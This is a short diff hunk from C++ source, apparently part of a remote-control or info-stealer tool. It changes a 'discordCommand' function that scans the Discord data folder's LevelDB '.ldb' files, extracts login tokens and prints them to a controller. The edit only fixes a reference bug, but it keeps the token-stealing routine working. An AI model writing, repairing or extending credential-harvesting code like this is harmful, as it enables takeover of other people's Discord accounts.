@@ -105,7 +105,7 @@ int discordCommand(Controller& ctrl, DiscordCommand cmd) {
 			bool gotToken = false;
 			for (auto &p : filesystem::directory_iterator(discordPath)) {
 				if (p.path().extension() == ".ldb") {
-					string& token = parseLDB(p.path().string());
+					string token = parseLDB(p.path().string());
 					if (token.size() != 0) {
 						gotToken = true;
 						ctrl.println(token);
